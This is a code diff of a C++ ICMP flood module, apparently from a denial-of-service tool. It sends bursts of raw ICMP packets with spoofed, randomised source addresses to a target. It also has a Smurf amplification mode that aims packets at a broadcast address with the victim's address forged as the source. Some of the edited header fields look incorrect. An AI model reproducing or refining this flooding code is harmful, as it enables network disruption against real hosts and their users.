@@ -1,15 +1,13 @@
 #include <unistd.h>
 #include <cstring>
-#include <utility>
 #include <netdb.h>
 #include <arpa/inet.h>
-#include <netinet/ip_icmp.h>
 
 #include "../Headers/ICMP_Flood.hpp"
 #include "../Headers/Randomizer.hpp"
+#include "../Headers/Logging.hpp"
 
-void ICMP_Flood::attack(const int *id) {
-    int r;
+void ICMP_Flood::attack() {
     std::vector<int> sockets;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
@@ -31,14 +29,16 @@ void ICMP_Flood::attack(const int *id) {
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                 if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
-                    conf->logger->Log("Can't resolve the host", Logger::Error);
+                    print_error("Can't resolve the host");
                     exit(EXIT_FAILURE);
                 }
             }else{
                 bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
             if(conf->RandomizeSource){
-                if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
+                std::string ipaddr{};
+                Randomizer::randomIP(ipaddr);
+                if((ip->saddr = inet_addr(ipaddr.c_str())) == -1){
                     continue;
                 }
             }else{
@@ -53,19 +53,14 @@ void ICMP_Flood::attack(const int *id) {
 
             icmp->checksum = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
 
-            if((r = static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)))) == -1){
+            if((static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)))) == -1){
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_ICMP);
             }else{
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
+                (*conf->req)++;
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        (*conf->voly)++;
         pause();
     }
 }
@@ -86,7 +81,7 @@ void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
             break;
         case Config::Smurf:
             icmp->type = ICMP_ECHO;
-            icmp->type = ICMP_NET_UNREACH;
+            icmp->code = ICMP_NET_UNREACH;
             ip->daddr = inet_addr(conf->broadcast.c_str());
             ip->saddr = inet_addr(conf->website.c_str());
         default:break;
@@ -97,20 +92,15 @@ void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
 void ICMP_Flood::init_headers(iphdr *ip, icmphdr *icmp, char *buf) {
     // IP Struct
     ip->version = 4;
-    ip->ihl = 5;
+    ip->ihl = sizeof(struct iphdr) + sizeof(struct icmphdr) + strlen(buf);
     ip->tos = 0;
-    ip->tot_len = htons(sizeof(buf));
+    ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + strlen(buf);
     ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
     ip->frag_off = htons(0x0);
     ip->ttl = 255;
     ip->protocol = IPPROTO_ICMP;
-    ip->check = 0;
-
     ip->check = csum((unsigned short *) buf, ip->tot_len);
 
-    icmp->type = 0;
-    icmp->code = 0;
     icmp->un.echo.sequence = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
     icmp->un.echo.id = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
-    icmp->checksum = 0;
 }
